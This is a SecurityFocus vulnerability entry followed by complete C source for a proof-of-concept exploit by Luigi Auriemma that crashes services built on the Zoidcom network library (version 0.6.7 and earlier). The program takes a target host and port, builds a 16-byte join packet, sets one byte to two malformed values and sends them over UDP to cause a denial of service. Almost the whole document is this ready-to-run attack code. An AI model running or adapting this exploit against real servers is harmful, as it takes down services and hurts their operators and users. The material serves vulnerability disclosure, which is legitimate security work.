source: http://www.securityfocus.com/bid/25326/info

The Zoidcom network library is prone to a denial of service vulnerability when handling malformed packets.

An attacker could exploit this to crash a network service that is implemented with the library. 

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif



#define VER         "0.1"
#define PORT        8899

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
  struct  sockaddr_in peer;
  int     sd,
    i;
  u16     port    = PORT;
  u8      buff[16];

#ifdef WIN32
  WSADATA    wsadata;
  WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

  setbuf(stdout, NULL);

  fputs("\n"
        "Zoidcom <= 0.6.7 crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

  if(argc < 2) {
    printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
	   "\n", argv[0], port);
    exit(1);
  }

  if(argc > 2) port = atoi(argv[2]);
  peer.sin_addr.s_addr = resolv(argv[1]);
  peer.sin_port        = htons(port);
  peer.sin_family      = AF_INET;

  printf("- target   %s : %hu\n",
	 inet_ntoa(peer.sin_addr), port);

  sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if(sd < 0) std_err();

  // the following is a classical join packet
  memcpy(buff,
	 "\xec\x03\x00\x00\x00\x68\xc0\xff\xe9\x00\x80\x07\x00\x64\x00\x01", 16);

  buff[8] = 0x69;
  printf("- send malicious packet 0x%02x\n", buff[8]);
  for(i = 0; i < 2; i++) {
    if(sendto(sd, buff, 16, 0, (struct sockaddr *)&peer, sizeof(peer))
       < 0) std_err();
    sleep(0);
  }

  sleep(ONESEC);

  buff[8] = 0xa9;
  printf("- send malicious packet 0x%02x\n", buff[8]);
  for(i = 0; i < 2; i++) {
    if(sendto(sd, buff, 16, 0, (struct sockaddr *)&peer, sizeof(peer))
       < 0) std_err();
    sleep(0);
  }

  close(sd);

  printf("- the server should have been crashed, check it
  manually\n");
  return(0);
}



u32 resolv(char *host) {
  struct  hostent *hp;
  u32     host_ip;

  host_ip = inet_addr(host);
  if(host_ip == INADDR_NONE) {
    hp = gethostbyname(host);
    if(!hp) {
      printf("\nError: Unable to resolv hostname (%s)\n", host);
      exit(1);
    } else host_ip = *(u32 *)hp->h_addr;
  }
  return(host_ip);
}



#ifndef WIN32
void std_err(void) {
  perror("\nError");
  exit(1);
}
#endif